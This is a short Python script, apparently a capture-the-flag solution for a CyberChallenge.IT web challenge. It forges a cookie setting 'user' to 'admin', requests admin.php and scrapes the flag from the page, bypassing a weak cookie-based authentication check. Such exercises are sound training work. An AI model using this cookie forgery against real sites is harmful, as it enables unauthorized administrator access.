#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

url = "http://baby2000.challs.cyberchallenge.it/"

s = requests.Session()
s.cookies['user'] = 'admin'

r = s.get(url + "admin.php")
soup = BeautifulSoup(r.text, 'html.parser')
flag = soup.find('span', id='flag').text
print(flag)